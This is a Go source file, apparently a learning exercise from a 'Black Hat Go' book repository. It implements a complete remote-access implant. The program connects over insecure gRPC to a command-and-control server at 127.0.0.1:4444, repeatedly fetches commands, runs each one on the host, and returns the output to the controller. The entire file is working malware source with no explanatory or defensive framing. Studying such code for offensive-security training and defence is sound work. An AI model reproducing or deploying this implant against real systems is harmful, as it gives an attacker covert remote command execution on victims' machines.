package main

import (
	"context"
	"log"
	"os/exec"
	"strings"
	"time"

	"github.com/mrchi/golang/Black-Hat-Go/ch14/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func main() {
	opts := []grpc.DialOption{grpc.WithTransportCredentials(insecure.NewCredentials())}
	conn, err := grpc.Dial("127.0.0.1:4444", opts...)
	if err != nil {
		log.Fatalln(err)
	}
	defer conn.Close()

	client := grpcapi.NewImplantClient(conn)
	ctx := context.Background()

	for {
		req := new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatalln(err)
		}
		if cmd.In == "" {
			time.Sleep(3 * time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}
